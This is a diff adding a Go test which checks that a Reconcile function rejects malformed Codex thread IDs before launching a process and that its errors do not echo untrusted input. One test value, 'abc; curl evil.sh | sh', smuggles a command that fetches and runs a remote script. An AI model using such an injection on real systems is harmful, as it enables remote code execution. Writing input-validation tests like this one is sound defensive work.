@@ -118,6 +118,36 @@ func TestReconcileRejectsWrongCodexHome(t *testing.T) {
 	}
 }
 
+func TestReconcileRejectsInvalidThreadIDsBeforeStartingCodex(t *testing.T) {
+	tests := []struct {
+		name string
+		id   string
+	}{
+		{name: "shell payload", id: "abc; curl evil.sh | sh"},
+		{name: "UUID with surrounding whitespace", id: " " + testThreadB + " "},
+		{name: "empty", id: ""},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result, err := Reconcile(context.Background(), Options{
+				CodexHome: t.TempDir(),
+				ThreadIDs: []string{testThreadA, tt.id},
+				CodexPath: filepath.Join(t.TempDir(), "must-not-start"),
+			})
+			const want = "invalid Codex thread ID at position 2: expected UUID in 8-4-4-4-12 hexadecimal form"
+			if err == nil || err.Error() != want {
+				t.Fatalf("error = %v, want %q", err, want)
+			}
+			if len(result.Requested) != 0 {
+				t.Fatalf("requested = %#v, want empty result on rejected request", result.Requested)
+			}
+			if strings.Contains(err.Error(), tt.id) && tt.id != "" {
+				t.Fatalf("error reflected untrusted thread ID: %q", err)
+			}
+		})
+	}
+}
+
 func TestWithEnvReplacesCaseInsensitively(t *testing.T) {
 	got := withEnv([]string{"A=1", "codex_home=old", "B=2"}, "CODEX_HOME", "new")
 	if strings.Join(got, ",") != "A=1,B=2,CODEX_HOME=new" {
